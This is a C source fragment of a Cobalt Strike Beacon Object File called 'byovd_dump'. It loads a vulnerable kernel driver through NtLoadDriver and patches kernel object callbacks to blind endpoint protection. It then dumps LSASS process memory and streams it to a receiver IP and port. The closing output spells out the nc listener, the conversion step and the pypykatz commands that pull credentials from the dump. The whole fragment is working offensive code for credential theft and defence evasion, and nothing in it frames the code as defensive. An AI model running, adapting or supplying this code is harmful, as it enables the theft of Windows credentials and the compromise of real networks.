    char *recvIp  = BeaconDataPtr(&parser, 64);           /* str: receiver IP   */
    int   recvPort = BeaconDataInt(&parser);              /* int: receiver port */

    if (!drvData || drvLen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Missing driver bytes (bin: argument)\n");
        return;
    }
    if (!recvIp || recvIp[0] == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Missing receiver IP (str: argument)\n");
        return;
    }
    if (recvPort <= 0 || recvPort > 65535) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid port (int: argument)\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Driver: %d bytes | Receiver: %s:%d\n", drvLen, recvIp, recvPort);

    /* Step 1: privileges */
    EnablePriv("SeLoadDriverPrivilege");
    EnablePriv("SeDebugPrivilege");

    /* Step 2: write driver to disk */
    if (!WriteDriver(drvData, drvLen)) goto cleanup;

    /* Step 3: create service key */
    if (!CreateSvcKey()) goto cleanup;

    /* Step 4: load driver via NtLoadDriver */
    if (!LoadDriver()) goto cleanup;

    /* Step 5: open device */
    if (!OpenDevice()) goto cleanup;

    /* Step 6: get ntoskrnl base + patch ObCallbacks */
    {
        QWORD ntosBase = GetNtosBase();
        if (!ntosBase) {
            BeaconPrintf(CALLBACK_ERROR, "[-] GetNtosBase failed\n");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] ntoskrnl base: 0x%llX\n",
                     (unsigned long long)ntosBase);

        /* Verify kernel R/W works before touching callbacks */
        QWORD ispOff = PsISPOffset();
        if (ispOff) {
            QWORD sysEproc = KReadQ(ntosBase + ispOff);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] PsInitialSystemProcess: 0x%llX (R/W OK)\n",
                         (unsigned long long)sysEproc);
        }

        if (!PatchObCallbacks(ntosBase)) goto cleanup;
    }

    /* Step 7: find LSASS and dump+stream */
    {
        DWORD lsassPid = FindLsassPid();
        if (!lsassPid) {
            BeaconPrintf(CALLBACK_ERROR, "[-] lsass.exe not found\n");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] lsass.exe PID: %lu\n", lsassPid);

        if (!DumpAndSend(lsassPid, recvIp, recvPort)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] DumpAndSend failed\n");
        }
    }

cleanup:
    Cleanup();
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] byovd_dump BOF complete\n"
                 "[*] Offline: nc -lvp %d > lsass_raw.bin  (run BEFORE this BOF)\n"
                 "[*]          python3 tools/rpm2minidump.py lsass_raw.bin lsass.dmp\n"
                 "[*]          pypykatz lsa minidump lsass.dmp\n",
                 recvPort);
}
